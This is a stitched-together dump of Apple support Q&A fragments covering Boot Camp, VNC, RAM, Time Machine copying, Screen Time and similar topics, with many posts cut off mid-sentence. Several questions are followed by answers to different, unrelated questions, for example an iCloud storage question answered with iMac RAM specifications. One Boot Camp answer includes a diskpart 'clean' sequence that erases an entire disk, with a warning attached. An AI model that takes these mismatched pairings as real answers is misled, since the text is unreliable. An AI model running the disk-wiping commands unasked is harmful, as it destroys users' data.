Cancel)\n\n*Tap on the status bar at top of the screen (this will take you to the oldest photos in your Camera Roll\n\n*Now tap on the first photo (at top left) without taking your finger off the screen and while keeping your finger down gently swipe across the screen and then swipe down continuously - this will select all photos up to the point at which you take your finger off the screen\n\n*Tap on the Trash can icon at bottom right to delete all selected photos\n\n\nNOTE: If you're doing this to free up space, then you will also need to remove your deleted photos from the Recently Deleted album (as photos are stored there for 30 days before actually being removed from your device). You can select the Recently Deleted album from the very bottom of the Albums screen in order to remove them from there and free up space.\n\nA: One way to do it on a Mac.\n\n\n*\n\n*Connect iPhone, quit Photos if it auto-launches.\n\n*Launch Image Capture [in Applications]\n\n*Select your phone on the left.\n\n*In the list on the right, select the first picture, scroll right down & shift/select the last picture.\n\n*Click the delete icon  & confirm.\n\nA: Ich bin dummkopf!   “Settings->general->reset->erase contents and settings” did the trick.

I am trying to define a new shortcut for \"Select the previous input source\", since the default shortcut (Control + Space) is conflicting with another app I need to use. Is there any table with a list of unused shortcuts in Mojave that could be good candidates for custom shortcuts? I am trying to find a balance between good usability (not having to stretch the hand in awkward positions to type the shortcut) and avoiding conflicts with already existing shortcuts.\n\nA: \nIs there any table with a list of unused shortcuts in Mojave that could be good candidates for custom shortcuts? \n\nThere is not. There are a few utilities out there which will show you which key combinations are in use¹ but none (that I am aware of) show you available keyboard shortcuts.\n¹ I believe KeyCue is the most well-known and best supported.\nOne common method among Mac power users is the use of a Hyper Key which is (generally speaking) where you remap holding down the Caps Lock key to equal holding down ⌘ ⇧ ⌥ ⌃ because few apps (and few macOS default shortcuts) use all 4 modifiers (mostly because it is awkward to try to press them all at once, which is why remapping the Caps Lock key is recommended).\nPersonally, I use a Hyper Key with Keyboard Maestro because, unlike shortcuts defined in System Preferences, Keyboard Maestro's shortcuts are easy to backup/restore, and easy to sync across multiple Macs.\n", "Q: Reinstalling Windows 10 on mid2011 iMac with Bootcamp apologies if this is inappropriate. I've posted this twice on r/applehelp on reddit and got no help, so I'm hoping someone here might be able to help me out. Copy-pasted from there:\nBackground: back in 2015 I successfully installed Windows 10 on my iMac (iMac 21.5-inch mid-2011, 2.5 GHz Intel Core i5) via Bootcamp, using a Windows 10 license (burned onto a CD) I got as a gift. I'm pretty sure I didn't use a bootable flash drive, but as of now that would be necessary as I've replaced the optical drive with a SSD. I had some minor and common issues at first (such as having no audio), but eventually those were resolved and the partition worked perfectly. I no longer have this partition and am interested in installing the OS again, but I don't remember how I did it back then.\nIssue 1: Boot Camp Assistant claims 'Windows 10 is not supported on this Mac'. Support software is already installed onto a flash drive. How would I go about installing Windows 10 if it's unsupported, and how did I manage to do it in the first place all those years ago? Did something change between then and now? I have tried some tricks that supposedly allow you to install the OS on an unsupported machine but those ultimately failed.\nIssue 2: A little while ago I tried using Parallels and it ran rather well, except that I couldn't use my Windows license key because it didn't register my computer as being the same one where I previously installed Windows. If I manage to install the OS again, would it accept my license key again?\nAny help is appreciated.\n\n\nUPDATE 4: I managed to revert my shameful and convoluted partitioning mistake by wiping out disk0 and reinstalling macOS + restoring a backup. Once everything was back the way it was, I used Boot Camp Assistant to create a partition for Windows (BOOTCAMP). A new problem arose, however, when the computer rebooted and all I got was a black screen with 'No bootable device found'.\nUpon pressing Option while restarting, I understand that there should be a legacy Windows option and an EFI Boot option. Because my iMac no longer has an optical drive and I am using a bootable USB, only the EFI option appears. I now believe this is the source of most problems I have come across. Something about the disk becoming a hybrid MBR-GPT and Windows (EFI Boot) not recognising it as GPT? I will look more into this and update.\n\nA: I’m assuming you have a bootable Windows 10 pen drive with Mac drivers.\nI didn’t read any tutorials for doing it, the following is what I would try given your circumstances (and considering I’ve already installed Windows a few times on a few different Macs for gaming).\nI would try to go on with the Bootcamp Assistant even though it says Windows 8, follow everything to the end, and ignore all the steps you don’t need, just so it creates the partition you need.\nWindows 8 drivers could work on Windows 10, but if you already have drivers, ignore it too (leave it unchecked). Do not insert or let the assistant erase or do anything to your bootable pendrive.\nThen when the Mac reboots, insert your pen drive with the Windows installation. If your Mac doesn’t automatically boot the pen drive, reboot again holding the option key and select the pen drive.\nInstall Windows normally on the partition created by the Bootcamp Assistant, and then install all drivers manually in case it doesn’t automatically do so.\n", "Q: Log into Mac from Ubuntu over VNC I know there are so many tutorials and solutions are posted on internet regarding this, but I am unable to solve my issue.\nI am using Ubuntu on my desktop and I also wanna access my MacBook (MacOS mojave 10.14.6) within local network. I followed “Sharing” preference panel and checked the box next to “Remote management” then “Computer Settings…” and made “VNC viewers may control screen with password” checked and set a simple password.\n\n\nBut I am having authentication issues while accessing from Ubuntu, It asks me username and password, I am putting same password which I set previously on mac configurations.\n\n\n\nBut IDK which username is needed to be put here, I tried so many like mac username, mac pc name, Ubuntu username even tried to keep it empty but it's not working, it's showing always authentication error, How do I solve this? Am I missing anything?\n\nA: Finally I have solved my problem by simply installing VNC Viewer, before it I was using Remmina. Now it's working fine without prompting for user name. But it has very poor performance.\nI also found another solution for my issue is TeamViewer on LAN, and it's much better than VNC Viewer in terms of speed. \n", "Q: Does icloud storage get freed up automatically after 30 days?

I’m looking to upgrade my iMac’s ram but don’t really know much about what’s compatible and what’s not. Is a ram with following features compatible with it?\nCrucial 16GB DDR4 2400Mhz SODIMM CL17 DRx8 Ram (PC4-19200)\nThanks a lot.\n\nA: General\nYou selected a DDR4-Generation module in the implementation of SO-DIM which is both matching.\nBut I am not quite sure about the frequency. DDR4 has two standard frequencies: 2400 and 2666 MHz. Normally 2400 is always supported as default, and the 2666 is optional for higher performance.\nHowever Apple is saying you should use a 2666 MHz for the iMac Retina 5K 27-inch 2019 model.\nSo you should use a memory module that is a Unbuffered Nonparity DDR4 SDRAM 2666MHz (PC4-21333) SO-DIMM. The brand should not matter.\nFor detailed information what all that means take a look at wikipedia.\n\nAnswer:\nYou selected a 2400 MHz module which normally should work, but apple seams to recommend 2666 MHz. To be 100% sure buy a 2666.\nSuggestion:\nYou selected a Crucial module, on their web site you can search for your system and list all memory modules that are compatible. Here you can only find 2666 MHz modules. So if you want to stick to crucial you can follow this link. That would be my suggestion because the modules match the Apple specificities and are also sold as compatible for your specific system.\n\nApple Information\nOn the web site you can view the specifications for the RAM modules.\nMemory specifications (iMac Retina 5K, 27-inch, 2019)\nThis iMac model feature Synchronous Dynamic Random-Access Memory (SDRAM) slots near the bottom of the computer with these memory specifications:\nNumber of memory slots: 4\nBase memory:    8GB (2 x 4GB DIMMs)\nMaximum memory: 64GB (4 x 16GB DIMMs)\nUse Small Outline Dual Inline Memory Modules (SO-DIMM) that meet all of these criteria:\nPC4-21333\nUnbuffered\nNonparity\n260-pin\n2666MHz DDR4 SDRAM\n\nA: Apple lists the iMac memory specifications at this page which will help you with a more general answer than just lots of yes/no questions.\nAlso, when shopping consider how helpful the seller is - most will want to be sure they sell you something appropriate instead of leaving you it figure out everything by dumping a mass of parts and hoping you can do the work to shop for fit.\n", "Q: How to make hyperlinks in iOS Mail app?

Have you verified you’ve given the software time to process what you type?\nThis is the simple way described here: Create hyperlink on Mail.app/Notes.app on iOS\nYour adding an alternate text needs something more complex and since Mail does not support markdown or other editing like that, you need to compose in another program and then copy/paste/mail if you don’t want to have the full link typed out and then converted.\nThe Drafts app is my editor of choice for this.

Virtualization (including Parallels 15 with Metal support) is not an option as this install is for Oculus Rift development which requires a very specific driver setup and as much video memory as possible from my eGPU.\nI am also using Parallels 15 to run from the bootcamp partition when I'm in Mac OSX and I don't need to run the Oculus (again the drivers are different for display so this is useful to modify files, or do development when I do not need to run the Oculus).  I only mention this as maybe there is something Parallels does to the partition that confuses Disk Utility?\nI would like to create a backup of the bootcamp partition in order to restore later if needed.  I have seen several people use Winclone, SuperDuper as well as vanilla Disk Utility with dd and hdiutil.  I would prefer not installing any external software as I know this should be totally possible with the already installed software.\nWhen I follow the instructions online here.  The first step is to simply create a dmg image of the bootcamp partition with Disk Utility by right clicking on the Bootcamp partition and selecting Image from ... where '...' is the name of my Bootcamp partition.  I leave Format: as read-only and Encryption as none.  When I hit save it unmounts the partition and gives me an alert to grant permission for the operation:\ndiskimages-helper wants to make changes.  Touch ID or enter your password to allow this.\nI would prefer to grant Disk Utility and any helpers permissions so I don't have to allow every time as I'm curious if this is part of the problem.

Perhaps someone with more knowledge about Disk Utility could explain how the dmg works?  Is it just referencing the Bootcamp partition in some way?  Or is this 115GB file just garbage?\n\nA: Disk Utility's ability to do block-copy was never very good, and was further hamstrung when APFS entered the scene and the job of handling DMGs was handed over to the Finder. It has always had troubles dealing with non-Apple file-systems, which is the main reason Winclone was born.\nYou're dealing with a container-ised NTFS volume, there aren't any tools in macOS that can do more than send files back & forth. Tim Perffitt's method was to give Winclone its own APFS-and-NTFS-savvy rsync framework, and to the best of my knowledge is unique.\nOne thought does occur though: You could pop one of Microsoft's free Windows 10 VM images into VMware Fusion or Oracle's VirtualBox (instead of running the Boot Camp install through a VM engine), mount your big NTFS partition into the VM and then use a Windows file-transfer method (e.g. Macrium Reflect or something rsync-based) to shuttle your stuff from the internal partition to an external target.\n", "Q: How to autoprocess screenshots with an optimizer such as ImageOptim and then place immediately back in pasteboard (clipboard) for paste? I'm not entirely clear on how the screenshot + pasteboard handling on macOS works.  For example, as a user I perceive that when I press <shift-control-cmd-4> I can select a region of my screen and capture this screenshot into the pasteboard.  I then can simply <cmd-v> (paste) this into many applications.  Fore example, if I paste this into most chat applications (Messages, MatterMost, Discord, etc.) it shows up as a PNG file that is then uploaded to the hosting service.\nIs there a way method to capture a pasteboard image and then send this to an optimizer (something like ImageOptim that generally get's between 15-25% additional lossless compression out of most screenshots) that can then put this back into the pasteboard for pasting it on into an app for additional seamless lossless compression?\n\nA: I don't want to take the time now to actually do it, so I'll just point you in the directions I would take. If better answers become available, we can just delete this one :-)\nThere are two region capturing methods native to the Mac, one saves the file (Desktop by default, but can be anywhere) and one just puts it in your clipboard (some temp file somewhere most likely).

In other words, my Mac backs up everything to one external drive and then I copy that entire backup directory to the second external drive. \nI researched and found this command to be good for any files to be moved and synchronized from source to destination directories:\nrsync -av --delete /Volume/Drive1/MyPictures/ /Volume/Drive1/MyPictures\n\nThat worked pretty well for any directory I store on the external hard drive except for Mac's backup directories. Running this causes an error:\nrsync -av --delete /Volume/Drive1/Backups.backupdb/ /Volume/Drive1/Backups.backupdb\n\nfailed: Operation not permitted (1)\nrsync error: some files could not be transferred (code 23)\n\nAny suggestions how to address this? I tried rsync -rtb and got the same error. Copying manually using Finder also alerts with The operation can’t be completed because backup items can’t be modified.\n\nA: Funnily enough, starting with macOS 10.12 the Finder has been granted special powers to perform an 'exact copy' on Time Machine archives. Use the Finder and only the Finder to give your .backups new homes, because Finder will maintain not only all permissions and metadata but either maintain or translate inode references for each item in the backup.\n\nA: You can't really. Time Machine uses hard links for directories and rsync (especially the one with macOS) does not support this.\nHowever in this case the best way to get two Time Machine is to select two disks as Time Machine disks in Time Machine Preferences. To create the second Time Machine partition you can use Disk Utility to copy the existing Time Machine partition.\n", "Q: Copy iCloud Photos library to a clean install I'm doing a clean install on a new HD for various reasons, and I'd like to move my 700GB Photos library over.

Unfortunately that would take weeks and exhaust my data cap many times over, so I'd like to avoid this if possible.\nI don't think I can use Migration Assistant because it will also move over all the stuff I'm doing a clean install to avoid.\nI tried copying the system Photos Library, \"Photos Library.photoslibrary\" to the new HD. The copy went fine, I booted from the new drive and opened it, set it as the system library, and turned on iCloud Photos. It said \"Updating\" for a minute, then switched to \"Uploading 100,000 photos\". I paused it immediately and turned off iCloud Photos. I'm assuming this means it would treat all the photos in the copied library as new, and duplicate everything.\nSo my question is, is there a way to copy my full Photos library and maintain iCloud sync without downloading all 700GB from iCloud?\n\nA: I ended up following ankii's suggestion and just chancing it by turning iCloud Photos back on and letting it upload 100,000+ photos.\nOn the plus side, it did sync successfully without duplicating any photos.\nOn the minus side, I started it on 09/08 and it just now finished on 09/17. So that's 9 solid days of \"uploading\". It was on a mostly idle iMac with broadband and it didn't seem to be taxing either the CPU or the network, so I'm not sure why it went so very very slowly.\nMy total data usage for the time is less than half the size of the library, so it does appear to have saved some data. No way to tell how long it would have taken to download the library from scratch.\nI still feel like there should be a better way, but I can report that copying the library to the new system and turning on iCloud Photos does work.\n", "Q: Force to install a software on older macos version is there a way for force the installation of a package to non supported version of macOS? Theorically there aren't problem of performances in this case.\nI've read that in some case is possibile to modify the file Info.plist a (How to open applications regardless of required version?) but doesen't work.\nAny suggestion? :)\n\nA: Your best bet is a Virtual Machine using VMWare or Parallels, as historystamp suggested.\nIn most cases, if the app won't install on a given version of macOS, there's probably a good reason for it. I wouldn't be surprised if it failed to run even if you managed to get it running.\nThat being said, if you are determined to try, there are two free tools to help:\n\n\n*\n\n*unpkg\n\n*Suspicious Package\nBoth will let you “extract” the contents of a package file. From there you can move them into the proper places and see if it runs.\n\nA: The most frequent reason for software to only operate within a certain range of OS-versions is that they rely on frameworks, APIs and features that don't exist (or work poorly) in older versions of macOS, or the software is too old to work with the newer OS because the frameworks/APIs they need have been deprecated or removed.\nOnce the OS and the software diverge too much, there's little chance of making them play together again.\n", "Q: Admin Password refused I have got a slightly strange issue. The other day I logged into my macbook without problems. It went into sleep mode, I tried in the evening to log in again. My password was refused. I reset the password via another admin account.

I did recover one of my backups, my password was refused, I reset it, key chain update worked. I was able to access the key chain but not my \"Safe notes\".\nAfter a day or so, again, my password was refused. Again resetting my password. keychain did not update the password.\nAlso tried another keyboard, with no luck. In any case, I was running Malwarebytes, but everything is clean.\nDo I really need a clean install?\nDo you have any other ideas how to solve this issue?\nThanks a Lot in advance!\n(High Sierra)\n\nA: I would suggest going to an Apple Store or calling Apple Support.  They will be able to go step-by-step to help you find out what the problem with your Mac is and fix it.\n", "Q: IPhone X randomly crashing while in use This started yesterday morning, and crashes about every 20 min or so of use, it was fine all night. And when it crashes, I get this red spike in battery performance. \nWhat’s going on and how do I fix it, phone is out if AppleCare and I don't know if it'll make it two more weeks for the new phone.\n\n\nA: First off, I would try force quitting all of your open apps and seeing if that solves the issue. It looks like 'HQ' in your list above is using quite a bit of battery.\nIf that fails, I would try a force restart of your iPhone. Note this is different than a standard power on/off.\nAlso, please confirm there is sufficient hard drive space on your iPhone. If you're low on space, really bizarre issues like random crashes can happen. I would suggest having a minimum of 10-15 GB.\nIf neither of the above suggestions apply, to rule out any hardware issue, I would still suggest taking your phone to the Genius Bar at Apple. You can make a reservation even if you're out of warranty.\nThey will run a battery of tests on your phone (for free) to let you know what may be wrong with it, and if it is hardware related, will give you pricing on a repair. Apple unfortunately does not expose these hardware tests to the general public.\nThey also have some limited leeway to go above and beyond for Apple customers depending on the issue you're having with your product, so keep that in mind.\n\nA: This sounds like a logic board issue. Have you ever seen your phone flash a solid color prior to the shutdowns? When it crashes/restarts, does it boot to the Apple Logo screen, or does it take you back to the screen you were on prior to the shutdown?\nThere is a specific log within Privacy > Analytics > Analytics Data that would indicate the logic board failure. Send a screen shot of this list & I can give you a better idea. \n", "Q: How can I check if my MacBook Pro is shut down without turning it back on? Sometimes I like to shut down my Macbook Pro (e.g. if I know I won't be using it for some time and I want to save battery).\nUnfortuantely, I can't figure out any way to actually check that it's shut down when the lid is closed. There's no visible signal from the outside, and if I open up the lid, then due to (what I consider to be) a terrible design decision, it automatically turns back on. I then have to wait quite a few seconds before I can manually shut it back down again.\nIs there a way I can either (a) see whether it's completely shut down without opening the lid, or (b) disable the automatic boot up upon opening the lid?\n\nA: Shut down before you close the lid.\nSet the lid behavior so that it does not auto wake.\nI set that behaviour when I want to clean the keyboard but you have to avoid the power button...\n", "Q: How to Map f2 to Ctrl u in Excel (to make cell editing easier) Just upgraded to High Sierra on my MacBook air 2011.\nUnfortunately my Excel keyboard shortcuts have stopped working - I was using Karabiner to map F2 (usual windows edit key) to use ctrl u, which makes it easier to use excel.\nI had to also move to Karabiner-elements, as the version I was using isn't compatible with High Sierra.\nI have attempted to write a .json file to setup a complex_modification, but it doesn't seem to work - the event viewer just shows the f2 key\nIm using MacOS 10.13.6\nExcel for Mac 2011 version 14.7.7\nKarabiner Elements 12.6.9\nThe code I wrote is:\n{\n    \"title\": \"F2 change to Ctrl U\",\n    \"rules\": [        \n        {\n            \"description\": \"F2 change to Ctrl U\",\n            \"manipulators\": [\n                {\n                    \"type\": \"basic\",\n                     \"from\": {\n                        \"key_code\": \"2\",\n                        \"modifiers\": {\n                            \"mandatory\": [\n                \"fn\"\n                ],\n                \"optional\": [\n                         \"any\"\n                        ]\n                        }\n                    },\n                     \"to\": [\n                        {\n                          \"key_code\": \"u\",\n                          \"modifiers\": [\n                            \"left_control\"\n                          ]\n                        } \n                    ]\n                }\n            ]\n        }\n    ]\n}\n\nWhat am I missing?\nThanks,\n\nA: I just used the \"customize keyboard\" in the Tools menu and it works fine...\nThis image shows it being set up:\n\n", "Q: Macbook wakes up at 1am My Macbook pro has been in sleep with open lid and power.

How can I change it? Is my old email address still connected to my iCloud account? How can I get rid of it? \n\nA: YES, you can change the email address associated with the Apple ID. The Apple ID is literally the email address (don't pay attention to the previous answer...)! It sounds like you created an ADDITIONAL Apple ID instead of updating the email address on your current Apple ID. \nNavigate to appleid.apple.com and login with your 'old' Apple ID email address, from here you will be able to update to your new email. However, you would also need to follow this process to login to appleid.apple.com with the NEW address and assign this a \"dummy\" email address so that you can assign the \"new\" email to your current Apple ID so that you retain all purchases and content associated with your iCloud account. \n", "Q: Startup Security Utility Admin Permission I have a company mac with admn privileges.

I know that Android phones let you change camera resolution.\nHow can I accomplish the same on iOS?\n\nA: Your phone's camera is limited by its hardware. Without opening the case and switching out several integrated circuits (and probably modifying the phone's firmware and operating system) you're not going to change that.\nAnd you forget another thing that many cellphone camera enthousiasts overlook when talking about their hardware, and that's the optics.\nThe main limiting factor of most if not all current cellphone cameras isn't the sensor at all, it's the lens that is actually responsible for generating the image.\nThat tiny piece of plastic (or glass if you're lucky) isn't really capable of providing the data needed for the sensors fitted to most modern cameras with enough resolution. \nThere's a reason why professional cameras have lenses with front elements that have a diameter of sometimes over 10 centimeter, and can weigh several kilos, and have sensors 24x36mm in size if not much larger in the really high end cameras.\nYou simply are never going to match that with your phone sensor the size of a nail clipping and ditto lens.\n\nA: Camera+ 2, available in the app store for US$4, is a very powerful app I use instead of Apple's Camera app. It provides Manual Controls, RAW Capture and Editing, Depth Capture & Editing, versatile Shooting Modes, superb Photo Library integration, etc. If you are a seasoned SLR camera user or not, this app will help you get the most out of your iPhone's camera, even if you're shooting at the maximum resolution the iPhone can provide. I wish I was able to replace the default Apple Camera app with Camera + 2!\nDisclaimer: I'm a contented user of Camera+ 2; and have no financial ties to LateNiteSoft S.L.\n\nA: Go to Settings > Camera.\nYou can select resolution and FPS for video & slo-mo. However, you cannot change the photo resolution.\nYou you will also be able to choose between high efficiency, using HEIF/HEVC, or most compatible, using JPEG/H.264.

I want FaceTime to be available all the time, without running into any time limits.\nI thought, I could set Screen Time like so:\n\n\n*\n\n*App Limits ==> All Apps & Categories = 1hr\n\n*Always Allowed ==> FaceTime\n\n\nI see that after he has talked to his grandparents on FaceTime for about 20~25 minutes, and played his game for 30~35 minutes, iOS will tell him that he has reached his daily limit.\nBut this seems wrong to me.  First, in Screen Time page, when I add all the categories up, it is definitely less than 1 hour.\nAnd even if they totaled an hour, his game usage is (as I have witnessed) no more than 30~35 minutes.  \nI would have expected that he could use 2 hours of FaceTime during the day (just to illustrate the point, not that he actually would do that!) without that triggering any limits, and ONLY AFTER playing on his game for (close to) 1 hour, would the iPad tell him that he has reached his limit.\n\n\n*\n\n*How can this be made to work better?\n\n*Does Apple need to revamp Screen Time a bit more?\n\n\nA: The text for \"Always Allowed\" says that it lets you use certain apps during Downtime or when the \"All Apps and Categories\" limit has passed. Unfortunately it doesn't say anything about not counting those apps towards any limits.\nYou could make a new limit that affects every app except Facetime, like this:\n\n(Here I used the Camera app as an example, but you would uncheck Facetime instead.)\nThis does have the disadvantage that any new downloaded app under Social Networking would also not be limited, but you could monitor for that pretty easily.\n\nA: We use a more manual solution. We set the All Apps limit to the desired total, and then if it is exceeded due to the ordering issue, we increase it for that day, and then set it back for the next day.\n", "Q: Client isolation while using Internet Sharing over WiFi I'm using my iMac as a WiFi router, I have a ethernet cable plugged in and sharing internet to my other devices using it's WiFi card.\nIt creates a WiFi network (infrastructure mode) and I can connect all my devices and use the internet just fine.\nMy problem is my devices doesn't have access to each other, so for example I can't see my Apple TV from my phone.\nIs there any way to turn client isolation off?\n\nA: I guess you have to turn off the Firewall in your iMac or at least go the Firewall setting and turn off \"Enable Stealth mode\" if this is ON. You can test first with this and if this don't help, then you can turn off Firewall fully on your iMac. It should work in this way.

I searched it on the AppStore but couldn't find it.\n\nA: Some developers don't like the App Store, and there's a wealth of reason why - Apple take too much money, Apple don't police the Store and stop the perpetual flood of cheap copies of decent apps, they don't like the restrictions placed on App Store stuff ...\n\nA: Business Reasons\nOn macOS, applications can be sold outside of Apple's Mac App Store.\nMany developers choose to sell their software through Apple's store in order to access the audience Apple provide.\nHowever, there are numerous business reasons a developer might choose to avoid the Apple operated stores. These include control over pricing, product, and direct customer access:\n\nIf you only sell your software in an app store and the store controls the contract, market place, and customer relationship, what exactly is your business built upon? You have one customer; the store. You are left at the whim of that store's policies. Are you really building your own business? Or are you building someone else's?\n\nIt is possible to sell Mac software both through Apple's Mac App Store and directly to customers outside the store.\nOn iOS, apps must be sold through Apple's App Store.\n\nA: There are a number of reasons developers may not want to go through the Mac App Store:\n\n\n*\n\n*Apple Developer account is required with paid annual subscription of\n$99\n\n*Apple review process may block certain features or APIs\n\n*Apple determines that the app does not follow other guidelines (ui, content, etc)\n\n*Apple requires some features to be implemented or will not pass review (example, 64bit compatibility)\n\n*Apps on the App Store run in Sandbox, and do not have access to other parts of the system except through Public APIs\n\n*Pricing... Apple takes 30% of the purchase price\n\n*Users are insulated from the developer... its like buying an electronic widget from a big box store but never turning in the warranty... the developer has no idea who is using their product.\n\n*Time limited demos are not allowed (developers get around this by doing In-App Purchases for \"Pro\" features)\n\n*They (the developer) has malicious intent (rare, but can happen... more often with free software though)\n\n\nBut there are also a number advantages for developers too:\n\n\n*\n\n*A great place to get exposure for your App\n\n*Don't need to deal with purchases or refunds\n\n*Support is limited to technical details and feature requests only\n\n*Don't need to build in copy protection (serial numbers, activation, etc) because authorization is handled by the Mac App Store\n\n*App is downloaded from Apples network, so don't need to worry about hosting bandwidth (an issue for popular software)\n\n", "Q: How to make Powerline fonts work with iTerm2 I have a problem with using Powerline fonts in the iTerm2.

I was wondering if there was an alternative to click-lock for mac? I can't use drag lock because of limited hand movement. I need something where I can move the cursor to where I want to drag, hold down the left or right mouse button for a number of seconds, be able to release, and then it will be in infinite drag until I click again to release the drag (similar to how click-lock is on Windows). I tried to use btt, but to no avail. Any help would be greatly appreciated.\n\nA: There is a built-in equivalent for trackpads, called dragging, which you find in System Preferences > Accessibility > Trackpad Options:\n\nIn case this is not sufficient for you or you need to use a mouse, have a look at the answers to this question. Currently the following third-party apps are being mentioned: \n\n\n*\n\n*Hammerspoon (free) is a popular choice for gestures and automation. It offers a feature called \"Grab Scroll\".\n\n*Karabiner (free) a similar and popular tool.\n\n*Smooze (commercial)\n\n*Smart Scroll (commercial)\n\n\nBetter Touch Tool (commercial) is my personal favourite as it allows so much more, such as another Windows-inspired feature, called window snapping, etc. The procedure here would be as follows:\n\n\n*\n\n*Open BTT preferences\n\n*Select Input device, i.e. Mouse\n\n*Select Trigger. The one you mention (i.e. long press) currently seems not to be available. (I suggest you make a feature request on their forum. The developer is usually very open to such requests.) Instead you could do e.g. middle-click.\n\n*Select action. Go to Window Resize & Move > Start/Stop Moving or search.\n\n\n\n\nA: This is an incomplete solution because it doesn't answer the question as asked.\nI'm hoping someone can find a solution that may involve the trackpad/gestures control panel, but I don't have any machine with one so I can't test.\nIn the meantime, if you have an extended keyboard, then Mouse Keys might go some way towards, if not exactly as asked, then some way towards achieving a similar result.\nIn System Prefs > Accessibility > Mouse & Trackpad there is Mouse Keys [in the Options you can set it to toggle on/off by tapping Opt 5 times]\nIt enables the 10-key NumPad on an extended keyboard to be used to drive the mouse cursor. 123, 46, 789 act as directional navigators. 5 is the click.\nI had hoped that with Mouse Keys on, it would allow you to press 5 & then drag the actual mouse to carry out the task. Unfortunately it won't do that, they seem to partially ignore each other. Any 'real' mouse seems to act independently, so 5 will click but dragging the mouse won't 'carry' that click.\nHowever, holding 5 & using the direction keys, the click does 'hold', so click & hold a title bar, for instance, then the keys will 'carry' the window until you release 5.  \n", "Q: How to increase font size for Urdu Language?

The problem is, neither tool is sufficient to get you accurate metrics to help you diagnose the perceived problem.\nPing\nPing measures how fast your network adapter responds to a request (a.k.a. Latency).   The problem with this is that you can have lightening fast latency (i.e. 10ms), but horrible bandwidth (56Kpbs) to transfer your files.\nWhere ping will come in handy is monitoring this latency over time assuming latency is the issue you're experiencing.\nBandwidth\nYou may have and pay for a high speed connection from your ISP, but what happens outside your ISP’s network could be the issue here.

I also downloaded Boot Camp drivers (5.1.5621) and installed. When drivers installation is done, I restarted my computer. Until restart process, everything (except Audio driver) seems perfect. After the reboot, there is a problem. Please see the image. Desktop and taskbar icons not show and programs windows not open. I can right-click on desktop but when I choose something (like New Folder) on context menu, nothing shows on desktop. I can run a software or open a .txt file from Start Menu, windows of them are not showed, but only icons of them are showed on taskbar. One more thing, when I move the mouse cursor to corners of screen, it disappears. I rebooted my Macbook Pro many times, still no luck. I re-installed Windows 10, this time I didn't install bootcamp drivers. But I connected the internet. I guess it installed some of drivers from internet automatically. So, same problem has been occured. Any idea?\nThank you.\n\n\nA: The problem is that Windows thinks you have two screens attached. You aren't seeing any icons or windows because they're opening up on the \"other\" screen, which you don't have (you're seeing the \"secondary\" screen).\nShort story:\nBecause you nuked the macOS partition and installed Windows from scratch, Windows likely installed in EFI mode, which is not supported on non-Retina (i.e. pre-2012) MacBook Pros.  It also explains why audio doesn't work.  If you had used the BootCamp Assistant to install Windows, it would have correctly prepared the hard drive and BIOS compatibility support for Windows.\nThe easiest, fastest way to fix this would be to attach a 2nd screen (you'll need a miniDP adapter) and configure Windows to ONLY use whichever screen the panel corresponds to.  Otherwise, you must take additional steps to get Windows installed correctly without the BootCamp Assistant:\n\n\n*\n\n*Option+Boot your MacBook Pro with the Windows media attached.  You should see two boot options. One says \"EFI Boot\", and the other just says \"Windows\".  Choose the one that says \"Windows\"\n\n*Once you are booted to Windows setup, hit Shift+F10 (Note that you may need to also use the Fn key). This will open up a command prompt.\n\n*From the command prompt, enter the following commands, one-by-one:\nNOTE: THIS WILL ERASE YOUR HARD DRIVE!\ndiskpart\nselect disk 0\nclean\ncreate partition primary\nexit\nexit\n\nNOTE: Yes, you really need to type exit twice.\n\n*Reboot the computer again (just for good measure) and Option+boot to the \"Windows\" option again.\n\n*Install Windows normally from this point on, selecting the partition you created in step 3 when it asks.\n\n\n\nLong story (TL;DR):\nApple was the first to market with a laptop that could switch between CPU-integrated and discrete graphics controllers.  Because Windows and the hardware of the era did not support this configuration at the time, Apple implemented some clever hacks to get it to work.  Firstly, they used custom video drivers that could copy the contents of video memory between the CPU's reserved system RAM and the GPU's dedicated RAM. The display is connected via a dual-channel LVDS connector. And finally, both GPUs (along with the mini-DisplayPort and optical audio) are wired to a hardware GMUX chip that can dynamically switch between the two.  MacOS handles the coordination and synchronization of the switch when it needs to happen, so it appears seamless and transparent to you, the user.  All of this was horribly unsupported by Windows at the time.\nOn top of this, Apple began using the UEFI firmware spec back in 2005 when they switched to Intel processors, but this feature didn't commonly begin appearing in PCs until Windows 8 got released back 2012 (although Windows 7 supported it).  This has nothing to do with graphics switching, but Apple had to write a BIOS Compatibility Support Module (CSM) into their firmware (which emulates a legacy PC BIOS) to run Windows XP on Macintosh hardware.\nApple was already accustomed to supporting Windows on incompatible hardware through the CSM since 2005, so when graphics switching came around, they just extended the CSM to play nice with Windows and ignored UEFI support since Windows didn't support it anyway.\nThe CSM provided the following hacks to Windows:\n\n\n*\n\n*UEFI is disabled.\n\n*The discrete GPU is powered on.\n\n*The GMUX chip switches to the correct LVDS channel to drive the display off the discrete GPU, locks the Thunderbolt port into mini-DisplayPort mode (no Thunderbolt support in Windows on 2011 models), and locks the audio to the analog output so the internal speakers will still work (no S/PDIF support in Windows either).\n\n*The discrete GPU's video ROM is copied to the correct RAM I/O ranges that Windows would expect.\n\n\nThis allows Windows to boot with the integrated graphics, Thunderbolt port, and optical audio-out ports completely invisible to it.  The CSM is invoked when an MBR partition table is detected on the hard drive (Macs also used GPT long before Windows did). And the BootCamp Assistant makes a hybrid GPT/MBR partition table for you that satisfies both Windows and macOS.\nNow we get down to your situation:\nWindows 10 fully supports UEFI and GPT partition tables, so it happily booted in UEFI mode and installed to your GPT-partitioned hard drive just fine.  But without the MBR partition table present (which Microsoft ONLY supports in legacy BIOS mode), the CSM did not get invoked, and therefore the hacks it provides do not get used.\nYour Mac does not have a discrete GPU in it (you would've gotten no video at all if it did), but it DOES still have that GMUX and dual-channel LVDS.  Without a discrete GPU, the video ROM and memory I/O ranges map correctly for an Intel-integrated GPU, and it uses both LVDS channels.  Windows is correctly seeing an Intel-integrated GPU, but is incorrectly seeing each LVDS channel as a different screen.  Also, it has no access to audio because the GMUX never switched the speakers to the analog audio output.\nLong story short, you MUST use BIOS Compatibility Support to run any version of Windows on a 2011-model MacBook Pros.  And the only way to kick the CSM into action (without the BootCamp Assistant's help) is to manually create an MBR partition table on the hard drive so the firmware sees it when you power the machine on.  And the only way to create an MBR partition table in Windows is to completely destroy the GPT table first (that's what the clean command to Diskpart does in the instructions above).\nGot it?  :-)  Sorry if all that was too technical.\n", "Q: How to restart using an app without it accessing older data? An app that I tried out a couple years ago somehow keeps identifying my old trial data (it required a signup with email, but now I'm trying to signup using a different email), even if I delete the app, reset the advertising identifier, and 